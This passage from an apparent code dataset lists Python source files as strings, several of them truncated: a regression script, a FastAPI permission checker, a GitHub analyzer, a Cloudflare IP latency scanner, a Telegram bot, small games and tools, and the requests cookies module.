dataset.\nclean_obj_col = list(obj_clean[obj_clean].index)\n\n# Applying OHE to the whole list\nohe = OneHotEncoder(sparse = False) # Initialize\n# Fills the df with ohe notation values (0.0 or 1.0) in the rows for each column.\nohe_col = pd.DataFrame(ohe.fit_transform(clean_data[clean_obj_col]))\nohe_col.index = clean_data.index # Places the correct index in the ohe_col, based on clean_data.index\nohe_col.columns = ohe.get_feature_names_out() # Places the correct labels (column names) for each column\n# print(ohe_col)\n\nfinal_data = clean_data.drop(clean_obj_col, axis = 1) # Drop all 'object' columns from cleaned dataset\n# Concatenate final_data with ohe_col horizontally to the right (default is axis = 0, where it will concatenate below).\nfinal_data = pd.concat([final_data, ohe_col], axis = 1)\n\n# -----Preprocessing, cleaning, EDA, and One Hot Encoder END-----\n\n\n# -----Machine Learning-----\n\n# Splitting data to training and testing\nx = final_data.drop(['SalePrice'], axis = 1) # Seperate the dataset from the label column\ny = final_data['SalePrice'] # Separate the label column from the rest of the dataset\nx_train, x_test, y_train, y_test = train_test_split(x, y, train_size = 0.8, test_size = 0.2, random_state = 0)\n\n# SVM\nsvm_reg = svm.SVR() # Initialize SVM (Regressor)\nsvm_reg.fit(x_train, y_train) # Train model\nypred = svm_reg.predict(x_test) # Test model\nprint(mean_absolute_percentage_error(y_true = y_test, y_pred = ypred))\n# Results are: 0.1870512931870423 ~ 18.71% error.\n\n# Random Forest Regressor\nrf_reg = RandomForestRegressor(n_estimators = 10) # Initialize Random Forest Regress",
    "from typing import List\n\nfrom fastapi import HTTPException, Request\n\nfrom auth_middleware.logging import logger\nfrom auth_middleware.settings import settings\nfrom auth_middleware.types import User\n\n\nclass GroupChecker:\n    \"\"\"Controls if user has the required group (user_type)\"\"\"\n\n    __allowed_groups: list = []\n\n    def __init__(self, allowed_groups: List):\n        self.__allowed_groups = allowed_groups\n\n    def __call__(self, request: Request):\n\n        if settings.AUTH_MIDDLEWARE_DISABLED:\n            return\n\n        if not hasattr(request.state, \"current_user\") or not request.state.current_user:\n            raise HTTPException(status_code=401, detail=\"Authentication required\")\n\n        user: User = request.state.current_user\n\n        if user.groups is not None and not any(\n            group in self.__allowed_groups for group in user.groups\n        ):\n            logger.debug(\n                f\"User with groups {user.groups} not in {self.__allowed_groups}\"\n            )\n            raise HTTPException(status_code=403, detail=\"Operation not allowed\")\n",
    "import os\nimport time\nfrom openai import OpenAI\nimport requests\nfrom dotenv import load_dotenv\n\n\nload_dotenv()\n# openai.api_key = os.getenv(\"OPENAI_API_KEY\")\ngithub_token = os.getenv(\"GITHUB_TOKEN\")\n\n\nclient = OpenAI(\n  api_key=os.environ['OPENAI_API_KEY']\n)\n\ndef analyze_repository(repo_url):\n    headers = {\"Authorization\": f\"token {github_token}\"}\n\n    time.sleep(2)\n\n    max_retries = 3\n    initial_delay = 1\n    endpoints = repo_url.split(\"/\")[-2] + \"/\" + repo_url.split(\"/\")[-1]\n\n\n    for attempt in range(max_retries):\n        \n        response = requests.get(f\"https://api.github.com/repos/{endpoints}\", headers=headers)\n\n        if response.status_code == 200:\n            repo_data = response.json()\n            if \"full_name\" in repo_data:\n                name = repo_data[\"full_name\"]\n            else:\n                print(\"Error: Could not find repository name in response data.\")\n                return None\n            \n            description = repo_data.get(\"description\", \"No description provided.\")\n            languages = repo_data.get(\"language\", \"Unknown\")\n            prompt = f\"This is a GitHub repository called '{name}'.\\n\"\n            prompt += f\"Description: {description}\\n\"\n            prompt += f\"Programming Language: {languages}\\n\"\n            prompt += \"What does this repository do in general?\\n\"\n            prompt += \"Why might someone use this repository?\\n\"\n\n            try:\n                response = client.completions.create(model = \"davinci-002\", prompt = prompt)\n            except:\n                print(\"\\nEither of the two things happend:\\n  1. You don't have sufficient quota for this model today.\\n  2. You're broke and don't have access to this GPT text model.\\n...and that's why I can't complete a single project\\n\")\n                exit()\n\n            analysis = response.choices[0].text.strip()\n\n            return analysis\n\n        elif response.status_code == 403:\n            print(\"Rate limit exceeded. Retrying...\")\n            delay = initial_delay * 2**attempt\n            time.sleep(delay)\n\n    print(f\"Error: Unexpected response status code: {response.status_code}\")\n    return None\n\n\nif __name__ == \"__main__\":\n\n    repo_url = input(\"Enter the GitHub repository URL: \")\n\n    analysis = analyze_repository(repo_url)\n\n    if analysis:\n        print(f\"\\nAnalysis of '{repo_url}':\\n\")\n        print(analysis)\n    else:\n        print(\"An error occurred. Please check the previous messages for details.\")\n",
    "import sys , os  , re\r\nfrom concurrent.futures import ThreadPoolExecutor\r\nfrom functools import partial\r\nfrom pathlib import Path\r\nimport datetime  \r\nimport socket\r\nimport zipfile\r\nimport shutil\r\nimport http.client\r\nimport socket\r\nimport ssl\r\nimport time\r\n\r\nimport argparse\r\nimport geoip2.database\r\n\r\nclass Colors:\r\n    RESET = \"\\033[0m\"\r\n    RED = \"\\033[91m\"\r\n    GREEN = \"\\033[92m\"\r\n    YELLOW = \"\\033[93m\"\r\n    BLUE = \"\\033[94m\"\r\n    MAGENTA = \"\\033[95m\"\r\n    CYAN = \"\\033[96m\"\r\n    WHITE = \"\\033[97m\" \r\n\r\ntotale = 0\r\nsuccess = 0\r\nfail = 0\r\nzip_url = \"zip.baipiao.eu.org\"\r\nrequest_url = \"speed.cloudflare.com\"\r\nrequest_url_path = \"/cdn-cgi/trace\"\r\ntimeout = 4 \r\nno_test = False \r\nheaders = {\"user-agent\": \"Mozilla/5.0\"}\r\nenable_tls = True\r\nverbose = False\r\nmax_workers = 10\r\ncountry_names = []\r\ncountry_continent_names = []\r\n\r\ndatabase_file = Path(__file__).with_name('GeoLite2-Country.mmdb')\r\nasn_database_file = Path(__file__).with_name('GeoLite2-ASN.mmdb')\r\n\r\nscript_dir = Path(__file__).parent\r\nresult_dir_day = datetime.datetime.now().strftime('%Y-%m-%d')\r\ntimestamp = f\"{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}\"\r\nresult_folder = f\"{script_dir}\\\\Result\\\\{result_dir_day}\\\\{timestamp}\"\r\n\r\n\r\ndef save_to_file(data , country_name):\r\n    os.makedirs(result_folder, exist_ok=True)\r\n    result_file = os.path.join(result_folder, f\"{country_name}_{timestamp}.txt\")\r\n    with open(result_file, \"a\") as f :\r\n        f.writelines(f\"{data}\\n\")\r\n        f.close()\r\n\r\n\r\ndef banner():\r\n    banner = \"\"\"\r\n  \u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 -      -\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \r\n \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d -      -\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\r\n \u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551  \u2588\u2588\u2588\u2557-\u2588\u2588\u2588\u2588\u2588\u2557-\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\r\n \u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2551   \u2588\u2588\u2551-\u255a\u2550\u2550\u2550\u2550\u255d-\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u255d \r\n \u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551     \u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d-      -\u2588\u2588\u2551\u2588\u2588\u2551     \r\n  \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d      \u255a\u2550\u2550\u2550\u2550\u2550\u255d -      -\u255a\u2550\u255d\u255a\u2550\u255d     \r\n\"\"\"\r\n\r\n    for l in banner.split('\\n') :\r\n        split = l.split('-')\r\n        if len(split) > 1:\r\n            print(Colors.RED + split[0], Colors.WHITE + split[1], Colors.YELLOW + split[2] + Colors.RESET)\r\n\r\n    max_banner_lenght =  max(len(banner) for banner in banner.split('\\n'))\r\n    print(Colors.WHITE + \"\".ljust(max_banner_lenght, '\u2500'))\r\n    space = \"   \"#.ljust(int(max_banner_lenght / 4 ), ' ') \r\n    print (space + \"\u2022Author  : \" , \"! AZERTY9 !\" )\r\n    print (space + \"\u2022Github  : \" , \"https://github.com/az3rty9\" )\r\n    print (space + \"Telegram : \" , \"https://t.me/az3rty9\" ) \r\n    print (space + \"\u2022Version : \" , \"1.0\" )\r\n    \r\n    print(\"\".ljust(max_banner_lenght, '\u2500'))\r\n\r\n\r\ndef remove_duplicates(input_file):\r\n    with open(input_file, 'r') as file:\r\n        lines = file.read().split('\\n') #.readlines()\r\n        unique_urls = list(set(lines))#list(dict.fromkeys(lines))\r\n    return unique_urls       \r\n\r\n\r\ndef print_ascii_table(data):\r\n\r\n    max_country_len = max(len(country) for country in data.keys())\r\n    max_count_len = max(len(str(count)) for count in data.values())\r\n\r\n    if max_count_len < 5 :\r\n        max_count_len = max_count_len + (5 - max_count_len  )\r\n    if max_country_len < 7 :\r\n        max_country_len = max_country_len + (7 - max_country_len)\r\n\r\n    print(f\"+{'-' * (max_country_len + 2)}+{'-' * (max_count_len + 2)}+\")\r\n    print(f\"| {'Country':<{max_country_len}} | {'Count':<{max_count_len }} |\")\r\n    print(f\"+{'-' * (max_country_len + 2)}+{'-' * (max_count_len + 2)}+\")\r\n\r\n\r\n    for country, count in data.items():\r\n        print(f\"| {country:<{max_country_len}} | { count:>{ max_count_len}} |\")\r\n\r\n\r\n    print(f\"+{'-' * (max_country_len + 2)}+{'-' * (max_count_len + 2)}+\")\r\n\r\n\r\ndef create_ssl_connection(ip_addr, port, timeout):\r\n    sock = socket.create_connection((ip_addr, port), timeout=timeout)\r\n    context = ssl.create_default_context()\r\n    context.check_hostname = False\r\n    context.verify_mode = ssl.CERT_NONE\r\n    ssl_sock = context.wrap_socket(sock, server_hostname=request_url)\r\n    return ssl_sock\r\n\r\n\r\ndef test_ipaddress (ip_addr, port):\r\n    try:  \r\n        conn = None\r\n        if int(port) in [443,2053,2083,2087,2096,8443] :\r\n            conn = create_ssl_connection(ip_addr, port, timeout)\r\n        else:\r\n           conn = socket.create_connection((ip_addr, port), timeout=timeout)  \r\n           \r\n        #,context=ssl._create_unverified_context()\r\n        client = http.client.HTTPSConnection(request_url) if not enable_tls else http.client.HTTPSConnection(request_url)\r\n        client.sock = conn\r\n                        \r\n        start_time = time.time()\r\n        client.request(\"GET\", request_url_path,headers=headers)\r\n        response = client.getresponse()\r\n        tcp_duration = time.time() - start_time\r\n        body = response.read().decode(\"utf-8\")\r\n        #print(body)\r\n        #matches = dict(re.findall(r\"(\\w+)=(.+)\", body))\r\n        #if matches.get('ip') == ip_addr:\r\n        if f\"ip={ip_addr}\" in body : \r\n            latency = f\"{tcp_duration * 1000:.0f} ms\"\r\n            return latency#, matches\r\n        conn.close()\r\n        return None       \r\n    except Exception as e:\r\n        #print(f'{Colors.RED}[ERROR]{Colors",
    "from telegram.ext import (\n    ApplicationBuilder,\n    CommandHandler,\n    ContextTypes,\n    MessageHandler,\n    filters,\n)\nfrom telegram import Update\nimport os\nfrom PIL import Image\nfrom rembg import remove\n\nTOKEN = \"\" #add the token here\n\n#change the paths\nORG_PATH = \".\\orgin\"\nEDIT_PATH = \".\\edit\"\n\n\nasync def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):\n    \"\"\"Send a help message.\"\"\"\n    message = \"Hi there! I'm a background removal bot. To get started, please use the /start command.\\nTo remove the background from an image, simply send the image to me.\"\n    await context.bot.send_message(chat_id=update.effective_chat.id, text=message)\n\n\nasync def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):\n    \"\"\"Send a start message.\"\"\"\n    message = \"To remove the background from an image, please send it to get started.\"\n    await context.bot.send_message(chat_id=update.effective_chat.id, text=message)\n\n\nasync def process_image(photo_name: str) -> str:\n    \"\"\"Process the image and remove the background.\"\"\"\n    name, _ = os.path.splitext(photo_name)\n    output_photo_path = os.path.join(EDIT_PATH, f\"edit{name}.png\")\n    input_path = os.path.join(ORG_PATH, photo_name)\n\n    with Image.open(input_path) as img:\n        output = remove(img)\n        output.save(output_photo_path)\n\n    os.remove(input_path)\n    return output_photo_path\n\n\nasync def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):\n    \"\"\"Handle incoming messages.\"\"\"\n    if filters.PHOTO.check_update(update):\n        file_id = update.message.photo[-1].file_id\n        unique_file_id = update.message.photo[-1].file_unique_id\n        photo_name = f\"{unique_file_id}.jpg\"\n    elif filters.Document.IMAGE.check_update(update):\n        file_id = update.message.document.file_id\n        unique_file_id = update.message.document.file_unique_id\n        _, f_ext = os.path.splitext(update.message.document.file_name)\n        photo_name = f\"{unique_file_id}{f_ext}\"\n\n    photo_file = await context.bot.get_file(file_id)\n    await photo_file.download_to_drive(custom_path=os.path.join(ORG_PATH, photo_name))\n\n    await context.bot.send_message(\n        chat_id=update.effective_chat.id,\n        text=\"Your image is currently being processed. Please wait a moment.\",\n    )\n\n    processed_image = await process_image(photo_name)\n    await context.bot.send_document(\n        chat_id=update.effective_chat.id, document=processed_image\n    )\n\n    sticker_image = Image.open(processed_image)\n    name2, _ = os.path.splitext(processed_image)\n    sticker_path = f\"{name2}.webp\"\n    sticker_image.save(sticker_path)\n    with open(sticker_path, \"rb\") as sticker_file:\n        await context.bot.send_sticker(\n            chat_id=update.effective_chat.id, sticker=sticker_file\n        )\n    os.remove(sticker_path)\n    os.remove(processed_image)\n\n\nif __name__ == \"__main__\":\n    application = ApplicationBuilder().token(TOKEN).build()\n\n    help_handler = CommandHandler(\"help\", help_command)\n    start_handler = CommandHandler(\"start\", start_command)\n    message_handler = MessageHandler(\n        filters.PHOTO | filters.Document.IMAGE, handle_message\n    )\n\n    application.add_handler(help_handler)\n    application.add_handler(start_handler)\n    application.add_handler(message_handler)\n\n    application.run_polling()\n",
    "from random import choice\n\nname = input(\"Welcome to the game \\nhow may I adress you ?\").title().strip()\nprint(f\"Hello there, {name} WELCOME TO THE TRUTH!\\n\")\n\ndef main():\n    the_game()\n    print(\"\\nNo one can escape the truth\")\n    replay()\n    \n    \ndef the_game():\n    print(\"You are suddenly awoken in the middle of nowhere, after travelling for about 5 minutes you found 2 ways : a village and a forest\")\n    choice_one = input(\"1. Enter the village \\n2. Enter the forest\\n\")\n    wild_animals = [\"Lion\",\"Tiger\",\"Bear\",\"Gorilla\"]\n    if choice_one == \"2\":\n        choice_two = input(f\"in the forest after walking for few minutes you unexpextly met a {choice(wild_animals)}, you either fight or flee ! \\n\")\n        if choice_two.lower() == \"fight\" :\n            print(\"YOU LOST THE FIGHT , YOU ARE DEAD!\")\n        elif choice_two.lower() == \"flee\" :\n            print(\"YOU CAN'T OUTRUN IT , YOU ARE DEAD !\")\n        else:\n            print(\"Invalid choice , YOU LOST\")\n\n    elif choice_one == \"1\":\n        choice_three = input(\"You met an old man inside the village all alone , after seeing you he offers you a place to stay\\nyou either accept or reject his offer\\n\").lower() \n        if choice_three == \"accept\":   \n            print(\"you ware led to an old house by the man , and were asked to stay there for the night\")\n            choice_four = input(\"You heard an errie voice in the house , you decided to either Investigate , hide in the house or run outside the village\\n\")\n            if choice_four.lower() == \"investigate\":\n                print(\"YOU FOUND A GHOST OUTSIDE , HE KILLED YOU\")\n            elif choice_four.lower() == \"hide\":\n                print(\"IN FEW HOURS, THE GHOST CAME INSIDE AND KILLS YOU\")\n            elif choice_four.lower() == \"run\":\n                choice_five = input(f\"in the forest after running for few minutes you unexpextly met a {choice(wild_animals)}, you either fight or flee ! \")\n                if choice_five.lower() == \"fight\" :\n                    print(\"YOU LOST THE FIGHT , YOU ARE DEAD!\")\n                elif choice_five.lower() == \"flee\" :\n                    print(\"YOU CAN'T OUTRUN IT , YOU ARE DEAD !\")\n                else:\n                    print(\"Invalid choice , YOU LOST\")\n            else:\n                print(\"Invalid Choice , YOU LOST\")\n        elif choice_three.lower() == \"reject\":\n            print(\"The old man got offended and decides to kill you anyway , YOU DIED\")\n        else:\n            print(\"Invalid choice, YOU LOSE!\")\n    \ndef replay():\n    if input(\"Wanna Play again?(yes/no)\") == \"yes\":\n        main()\n    else:\n        print(\"Thank you for playing this game\")\n\nmain()",
    "from tkinter import *\r\nfrom cmath import *\r\n\r\ndef button_click(num):\r\n    current = input.get()\r\n    input.delete(0, END)\r\n    input.insert(0, str(current) + str(num))\r\n\r\ndef button_clear():\r\n    input.delete(0, END)\r\n\r\ndef button_add():\r\n    first_num = input.get()\r\n    global f_num\r\n    global math\r\n    math = \"+\"\r\n    f_num = float(first_num)\r\n    input.delete(0, END)\r\n    global down\r\n    down = \"True\"\r\n\r\ndef button_equal():\r\n    global second_num\r\n    second_num = input.get()\r\n    input.delete(0, END)\r\n\r\n    if math == \"+\":\r\n        input.insert(0, f_num + float(second_num))\r\n    \r\n    if math == \"-\":\r\n        input.insert(0, f_num - float(second_num))\r\n\r\n    if math == \"*\":\r\n        input.insert(0, f_num * float(second_num))\r\n\r\n    if math == \"/\":\r\n        input.insert(0, f_num / float(second_num))\r\n    \r\n    Storia()\r\n\r\ndef button_sub():\r\n    first_num = input.get()\r\n    global f_num\r\n    global math\r\n    math = \"-\"\r\n    f_num = float(first_num)\r\n    input.delete(0, END)\r\n    global down\r\n    down = \"True\"\r\n\r\ndef button_mul():\r\n    first_num = input.get()\r\n    global f_num\r\n    global math\r\n    math = \"*\"\r\n    f_num = float(first_num)\r\n    input.delete(0, END)\r\n    global down\r\n    down = \"True\"\r\n\r\ndef button_div():\r\n    first_num = input.get()\r\n    global f_num\r\n    global math\r\n    math = \"/\"\r\n    f_num = float(first_num)\r\n    input.delete(0, END)\r\n    global down\r\n    down = \"True\"\r\n\r\ndef button_sqr():\r\n    first_num = input.get()\r\n    global f_num\r\n    global math\r\n    math = \"\u00b2\"\r\n    f_num = float(first_num)\r\n    input.delete(0, END)\r\n    input.insert(0, f_num ** 2)\r\n    Storia()\r\n\r\ndef button_root():\r\n    first_num = input.get()\r\n    global f_num\r\n    global math\r\n    math = \"\u00b2\u221a\"\r\n    f_num = float(first_num)\r\n    input.delete(0, END)\r\n    global radice\r\n    radice = sqrt(f_num)\r\n    input.insert(0, radice.real)\r\n    Storia()\r\n\r\ndef button_1div():\r\n    first_num = input.get()\r\n    global f_num\r\n    global math\r\n    math = \"1 /\"\r\n    f_num = float(first_num)\r\n    input.delete(0, END)\r\n    input.insert(0, 1 / f_num)\r\n    Storia()\r\n\r\ndef button_Asso():\r\n    first_num = input.get()\r\n    global f_num\r\n    global math\r\n    math = \"+/-\"\r\n    f_num = float(first_num)\r\n    input.delete(0, END)\r\n    input.insert(0, -1 * f_num)\r\n    Storia()\r\n\r\ndef button_BSpace():\r\n    global current\r\n    current = input.get()\r\n    current = current[:-1]\r\n    input.delete(0, END)\r\n    input.insert(0, current)\r\n\r\ndef button_Percen():\r\n    first_num = input.get()\r\n    global f_num\r\n    global math\r\n    math = \"%\"\r\n    f_num = float(first_num)\r\n    input.delete(0, END)\r\n    input.insert(0, f_num / 100)\r\n    Storia()\r\n\r\nhistory_text = \"\"\r\ndown = \"\"\r\n\r\ndef Storia():\r\n    global history_text\r\n    global f_num  # Include f_num to properly store the first number\r\n    global down\r\n\r\n    # Construct the history entry\r\n    if down == \"True\":\r\n        history_entry = f\"{f_num} {math} {float(second_num)}\"\r\n\r\n    if math == \"1 /\":\r\n        history_entry = f\"{math} {f_num}\"\r\n\r\n    if math == \"%\":\r\n        history_entry = f\"{f_num}{math}\"\r\n\r\n    if math == \"+/-\":\r\n        history_entry = f\"{math}{f_num}\"\r\n    \r\n    if math == \"\u00b2\u221a\":\r\n        history_entry = f\"{math}{f_num}\"\r\n\r\n    if math == \"\u00b2\":\r\n        history_entry = f\"{f_num}{math}\"\r\n\r\n    # Append the entry to the history_text\r\n    history_text += history_entry\r\n    \r\n    # Update the history textbox\r\n    history.delete(0, END)\r\n    history.insert(END, history_text)\r\n\r\ndef button_DelAll():\r\n    global history_text\r\n    history_text = \"\"  # Reset history text to empty string\r\n    history.delete(0, END)\r\n    input.delete(0, END)\r\n\r\ndef answer():\r\n    history.delete(0, END)\r\n    global history_text\r\n    history_text = \"\"\r\n\r\n# window\r\nwindow = Tk()\r\nwindow.title('Calculator')\r\n# window.geometry('with x height')\r\n\r\n# title\r\ntitle_label = Label(master = window, text = 'Calculator', font = 'Calibri 20 bold')\r\ntitle_label.grid(row=0, column=0, columnspan=4, padx=10, pady=10)\r\n\r\n# input\r\ninput = Entry(window, width=35)\r\ninput.grid(row=2, column=0, columnspan=4, padx=10, pady=10)\r\n\r\n# history\r\nhistory = Entry(window, width=25)\r\nhistory.grid(row=1, column=0, columnspan=4, padx=10, pady=10)\r\n\r\n# buttons\r\nbutton1 = Button(window, text=\"1\", padx=20, pady=10, command=lambda: button_click(1), bg='white')\r\nbutton2 = Button(window, text=\"2\", padx=20, pady=10, command=lambda: button_click(2), bg='white')\r\nbutton3 = Button(window, text=\"3\", padx=20, pady=10, command=lambda: button_click(3), bg='white')\r\n\r\nbutton4 = Button(window, text=\"4\", padx=20, pady=10, command=lambda: button_click(4), bg='white')\r\nbutton5 = Button(window, text=\"5\", padx=20, pady=10, command=lambda: button_click(5), bg='white')\r\nbutton6 = Button(window, text=\"6\", padx=20, pady=10, command=lambda: button_click(6), bg='white')\r\n\r\nbutton7 = Button(window, text=\"7\", padx=20, pady=10, command=lambda: button_click(7), bg='white')\r\nbutton8 = Button(window, text=\"8\", padx=20, pady=10, command=lambda: button_click(8), bg='white')\r\nbutton9 ",
    "import datetime\n\nfrom threaddump.Stacktrace import Thread, ThreadState, StackFrame, SyncObject, SyncObjectType, ThreadDump\nimport re\nimport threaddump.Config as Config\n\n\ndef __should_include__(stacktrace: list[StackFrame], include_patterns: list[str], exclude_patterns: list[str]) -> bool:\n    if include_patterns and len(include_patterns) > 0:\n        include = False\n        for pattern in include_patterns:\n            if include:\n                break\n\n            for stack_frame in stacktrace:\n                if re.match(pattern, str(stack_frame), re.MULTILINE):\n                    include = True\n                    break\n\n        if not include:\n            return False\n\n    if exclude_patterns and len(exclude_patterns) > 0:\n        exclude = False\n        for pattern in exclude_patterns:\n            if exclude:\n                break\n\n            for stack_frame in stacktrace:\n                if re.match(pattern, str(stack_frame), re.MULTILINE):\n                    exclude = True\n                    break\n\n        if exclude:\n            return False\n\n    return True\n\n\nclass LongRunningThread:\n    def __init__(self, thread: Thread, count: int, first_apparition: datetime.datetime,\n                 last_apparition: datetime.datetime, duration: datetime.timedelta):\n\n        self.thread = thread\n        self.count = count\n        self.first_apparition = first_apparition\n        self.last_apparition = last_apparition\n        self.duration = duration\n\n\ndef find_long_running_threads(tds: list[ThreadDump], *, config: Config) -> list[LongRunningThread]:\n    long_running_threads = {}\n    include_patterns = config.long_running_threads_include_patterns\n    exclude_patterns = config.long_running_threads_exclude_patterns\n\n    for thread_dump in tds:\n        for thread in thread_dump.threads:\n            if not __should_include__(thread.stacktrace, include_patterns, exclude_patterns):\n                continue\n\n            if not thread.thread_id in long_running_threads:\n                long_running_threads[thread.thread_id] = {\n                    \"thread\": thread,\n                    \"count\": 1,\n                    \"first_apparition\": thread_dump.date_time,\n                    \"last_apparition\": thread_dump.date_time\n                }\n            else:\n                # thread remain still\n                if thread.stacktrace == long_running_threads[thread.thread_id][\"thread\"].stacktrace:\n                    long_running_threads[thread.thread_id][\"count\"] += 1\n\n                    current_td_date = thread_dump.date_time\n                    last_td_date = long_running_threads[thread.thread_id][\"last_apparition\"]\n                    first_td_date = long_running_threads[thread.thread_id][\"first_apparition\"]\n\n                    if current_td_date > last_td_date:\n                        long_running_threads[thread.thread_id][\"last_apparition\"] = current_td_date\n\n                    if current_td_date < first_td_date:\n                        long_running_threads[thread.thread_id][\"first_apparition\"] = current_td_date\n\n                # thread changed\n                else:\n                    long_running_threads[thread.thread_id] = {\n                        \"thread\": thread,\n                        \"count\": 1,\n                        \"first_apparition\": thread_dump.date_time,\n                        \"last_apparition\": thread_dump.date_time\n                    }\n\n    long_running_threads = [LongRunningThread(\n        thread[\"thread\"],\n        thread[\"count\"],\n        thread[\"first_apparition\"],\n        thread[\"last_apparition\"],\n        thread[\"last_apparition\"] - thread[\"first_apparition\"]\n    ) for thread in long_running_threads.values() if thread[\"count\"] >= config.long_running_threads_threshold]\n\n    return long_running_threads\n\n\nclass ThreadsWithRecurringStacktrace:\n    def __init__(self, threads: list[Thread]):\n        self.threads = threads\n        self.recurring_stacktrace = threads[0].stacktrace\n\n\nclass ThreadDumpsWithRecurringThreads:\n    def __init__(self, thread_dump_date: datetime.datetime,\n                 threads_with_recurring_stacktrace: list[ThreadsWithRecurringStacktrace]):\n\n        self.thread_dump_date = thread_dump_date\n        self.threads_with_recurring_stacktrace = threads_with_recurring_stacktrace\n\n\ndef find_most_recurring_threads(tds: list[ThreadDump], *, config: Config) -> list[ThreadDumpsWithRecurringThreads]:\n    if config.debug:\n        print(\"Finding most recurring threads...\")\n\n    include_patterns = config.most_recurring_threads_include_patterns\n    exclude_patterns = config.most_recurring_threads_exclude_patterns\n\n    recurring_threads = []\n    for td in tds:\n        recurring_threads_in_td = {}\n        for thread in td.threads:\n            if not __should_include__(thread.stacktrace, include_patterns, exclude_patterns):\n                continue\n\n            # ignore dummy threads\n            if config.most_recurring_threads_ignore_dummy_threads and len(thread.stacktrace) == 0:\n            ",
    "import torch\nimport numpy as np\nfrom torch import nn\nimport torch.nn.functional as F\n\n\nclass CNN(nn.Module):\n    def __init__(self, c_in, c_out_mod,c_out_sig):\n        super(CNN, self).__init__()\n\n        self.embedding = nn.Sequential(\n            nn.Conv1d(c_in, 16, 3),\n            nn.BatchNorm1d(16),\n            nn.ReLU(),\n            nn.Dropout(0.25),\n            nn.MaxPool1d(2))\n        self.mod_head = nn.Sequential(\n            nn.Conv1d(16, 16, 3),\n            nn.BatchNorm1d(16),\n            nn.ReLU(),\n            nn.Dropout(0.25),\n            nn.Flatten(),\n            nn.LazyLinear(256),\n            nn.BatchNorm1d(256),\n            nn.ReLU(),\n            nn.Dropout(0.5),\n            nn.LazyLinear(c_out_mod))     \n        self.sig_head = nn.Sequential(\n            nn.Conv1d(16, 16, 3),\n            nn.BatchNorm1d(16),\n            nn.ReLU(),\n            nn.Dropout(0.25),\n            nn.Flatten(),\n            nn.LazyLinear(256),\n            nn.BatchNorm1d(256),\n            nn.ReLU(),\n            nn.Dropout(0.5),\n            nn.LazyLinear(c_out_sig))  \n\n    def forward(self, x):\n        embedding_output = self.embedding(x)\n        embedding_output = F.normalize(embedding_output)\n        pred_mod = self.mod_head(embedding_output)\n        pred_sig = self.sig_head(embedding_output)\n        return pred_mod, pred_sig",
    "\"\"\"\nrequests.cookies\n~~~~~~~~~~~~~~~~\n\nCompatibility code to be able to use `cookielib.CookieJar` with requests.\n\nrequests.utils imports from here, so be careful with imports.\n\"\"\"\n\nimport calendar\nimport copy\nimport time\n\nfrom ._internal_utils import to_native_string\nfrom .compat import Morsel, MutableMapping, cookielib, urlparse, urlunparse\n\ntry:\n    import threading\nexcept ImportError:\n    import dummy_threading as threading\n\n\nclass MockRequest:\n    \"\"\"Wraps a `requests.Request` to mimic a `urllib2.Request`.\n\n    The code in `cookielib.CookieJar` expects this interface in order to correctly\n    manage cookie policies, i.e., determine whether a cookie can be set, given the\n    domains of the request and the cookie.\n\n    The original request object is read-only. The client is responsible for collecting\n    the new headers via `get_new_headers()` and interpreting them appropriately. You\n    probably want `get_cookie_header`, defined below.\n    \"\"\"\n\n    def __init__(self, request):\n        self._r = request\n        self._new_headers = {}\n        self.type = urlparse(self._r.url).scheme\n\n    def get_type(self):\n        return self.type\n\n    def get_host(self):\n        return urlparse(self._r.url).netloc\n\n    def get_origin_req_host(self):\n        return self.get_host()\n\n    def get_full_url(self):\n        # Only return the response's URL if the user hadn't set the Host\n        # header\n        if not self._r.headers.get(\"Host\"):\n            return self._r.url\n        # If they did set it, retrieve it and reconstruct the expected domain\n        host = to_native_string(self._r.headers[\"Host\"], encoding=\"utf-8\")\n        parsed = urlparse(self._r.url)\n        # Reconstruct the URL as we expect it\n        return urlunparse(\n            [\n                parsed.scheme,\n                host,\n                parsed.path,\n                parsed.params,\n                parsed.query,\n                parsed.fragment,\n            ]\n        )\n\n    def is_unverifiable(self):\n        return True\n\n    def has_header(self, name):\n        return name in self._r.headers or name in self._new_headers\n\n    def get_header(self, name, default=None):\n        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n        raise NotImplementedError(\n            \"Cookie headers should be added with add_unredirected_header()\"\n        )\n\n    def add_unredirected_header(self, name, value):\n        self._new_headers[name] = value\n\n    def get_new_headers(self):\n        return self._new_headers\n\n    @property\n    def unverifiable(self):\n        return self.is_unverifiable()\n\n    @property\n    def origin_req_host(self):\n        return self.get_origin_req_host()\n\n    @property\n    def host(self):\n        return self.get_host()\n\n\nclass MockResponse:\n    \"\"\"Wraps a `httplib.HTTPMessage` to mimic a `urllib.addinfourl`.\n\n    ...what? Basically, expose the parsed HTTP headers from the server response\n    the way `cookielib` expects to see them.\n    \"\"\"\n\n    def __init__(self, headers):\n        \"\"\"Make a MockResponse for `cookielib` to read.\n\n        :param headers: a httplib.HTTPMessage or analogous carrying the headers\n        \"\"\"\n        self._headers = headers\n\n    def info(self):\n        return self._headers\n\n    def getheaders(self, name):\n        self._headers.getheaders(name)\n\n\ndef extract_cookies_to_jar(jar, request, response):\n    \"\"\"Extract the cookies from the response into a CookieJar.\n\n    :param jar: cookielib.CookieJar 